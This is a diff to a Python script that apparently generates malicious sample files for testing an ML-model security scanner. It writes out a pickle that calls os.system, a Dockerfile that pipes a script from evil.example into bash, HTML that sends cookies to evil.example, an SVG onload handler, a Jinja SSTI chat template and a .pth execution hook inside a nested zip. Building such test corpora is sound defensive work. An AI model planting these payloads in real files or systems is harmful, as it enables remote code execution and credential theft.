@@ -23,12 +23,22 @@ import io
 import json
 import os
 import pickle
+import struct
 import sys
 import tarfile
 import zipfile
 
 EXPECT: dict[str, dict] = {}
 FILES: list[tuple[str, bytes]] = []
+
+
+
+def _need(mod: str):
+    try:
+        return __import__(mod)
+    except Exception:  # noqa: BLE001
+        print(f"  (пропуск: нет модуля {mod})", file=sys.stderr)
+        return None
 
 
 def add(name: str, data: bytes, checks: list[str], note: str = "") -> None:
@@ -363,6 +373,90 @@ def gen_wave5() -> None:
     _ = binascii
 
 
+
+# --------------------------------------------------------------------------
+# Волна 6: protocol-0 pickle, Dockerfile, HTML/SVG, GGUF-шаблон, вложенные архивы, битые контейнеры
+# --------------------------------------------------------------------------
+def gen_wave6() -> None:
+    # protocol 0 (текстовый pickle) — обфускация: бинарь не начинается с \x80
+    p0 = b"cos\nsystem\n(S'echo proto0-payload'\ntR."
+    add("vuln_pickle_proto0.pkl", p0, ["A-01"], "текстовый pickle protocol 0 с os.system")
+
+    add("vuln_dockerfile.dockerfile",
+        b"FROM python:3.12-slim\nRUN curl -sL http://evil.example/install.sh | bash\n"
+        b"CMD ['python', 'serve.py']\n",
+        ["EXEC-02", "INT-03"], "Dockerfile скачивает и исполняет код")
+
+    add("vuln_card_xss.html",
+        b"<!doctype html><html><body><h1>Model</h1>"
+        b"<script>fetch('http://evil.example/collect?c='+document.cookie)</script>"
+        b"</body></html>",
+        ["INJ-05", "INT-03"], "HTML-карточка модели со скриптом (XSS)")
+    add("vuln_asset.svg",
+        b"<svg xmlns='http://www.w3.org/2000/svg' onload=\"javascript:alert(1)\">"
+        b"<text>model</text></svg>",
+        ["INJ-05"], "SVG с обработчиком onload/javascript:")
+
+    # GGUF с опасным Jinja chat_template (LLM-модель)
+    gguf = _need("gguf")
+    if gguf is not None:
+        import numpy as np
+        from gguf import GGUFWriter
+        import tempfile
+        with tempfile.NamedTemporaryFile(suffix=".gguf", delete=False) as tf:
+            tmp = tf.name
+        w = GGUFWriter(tmp, "mlscan-synthetic")
+        w.add_name("evil-template")
+        w.add_string("tokenizer.chat_template",
+                     "{% for x in ''.__class__.__mro__[1].__subclasses__() %}{{ x }}{% endfor %}")
+        w.add_tensor("token_embd.weight", np.zeros((16, 4), dtype="float32"))
+        w.write_header_to_file()
+        w.write_kv_data_to_file()
+        w.write_tensors_to_file()
+        w.close()
+        data = open(tmp, "rb").read()
+        os.unlink(tmp)
+        add("vuln_gguf_template.gguf", data, ["INJ-01"], "GGUF с опасным chat_template (SSTI)")
+
+    # вложенный архив: payload спрятан на втором уровне
+    inner = io.BytesIO()
+    with zipfile.ZipFile(inner, "w") as z:
+        z.writestr("payload.pth", "import os; os.system('echo nested-payload')\n")
+        z.writestr("helper.py", "import os\nos.system('echo nested-py')\n")
+    outer = io.BytesIO()
+    with zipfile.ZipFile(outer, "w") as z:
+        z.writestr("model/config.json", json.dumps({"hidden_size": 4}))
+        z.writestr("model/inner.zip", inner.getvalue())
+    add("vuln_nested_zip.zip", outer.getvalue(), ["EXEC-02", "INT-04"],
+        "zip в zip: .pth-хук и опасный код во вложенном архиве")
+
+    # битые контейнеры -> FMT-01
+    hdr = json.dumps({"w": {"dtype": "F32", "shape": [2], "data_offsets": [0, 8]}},
+                     separators=(",", ":")).encode()
+    add("vuln_bad_safetensors.safetensors",
+        struct.pack("<Q", 10_000_000) + hdr + b"\x00" * 8, ["FMT-01"],
+        "safetensors с некорректной длиной заголовка")
+    add("vuln_bad_tar.tar", os.urandom(256), ["FMT-01"], "повреждённый tar-архив")
+    add("vuln_bad_notebook.ipynb", b'{"cells": [ {"cell_type": "code", "source": ["x"] }',
+        ["FMT-01"], "notebook с нечитаемым JSON")
+
+    # реальный ONNX с кастомной операцией
+    onnx = _need("onnx")
+    if onnx is not None:
+        from onnx import TensorProto, helper
+        import numpy as _np  # noqa: F401
+        node = helper.make_node("MyCustomOp", ["x"], ["y"], domain="ai.onnx.contrib")
+        g = helper.make_graph([node], "custom",
+                              [helper.make_tensor_value_info("x", TensorProto.FLOAT, [1, 4])],
+                              [helper.make_tensor_value_info("y", TensorProto.FLOAT, [1, 4])])
+        m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13),
+                                                helper.make_opsetid("ai.onnx.contrib", 1)])
+        m.ir_version = 8
+        add("vuln_onnx_customops.onnx", m.SerializeToString(), ["EXEC-06"],
+            "ONNX с кастомной операцией (ai.onnx.contrib)")
+
+
+
 def main() -> int:
     ap = argparse.ArgumentParser(description="Дополнительные вредоносные примеры (Волна 4)")
     ap.add_argument("--out", default="/tmp/extra")
@@ -383,6 +477,7 @@ def main() -> int:
     gen_behavior_state()
     gen_archive_script()
     gen_wave5()
+    gen_wave6()
 
     os.makedirs(args.out, exist_ok=True)
     for name, data in FILES:
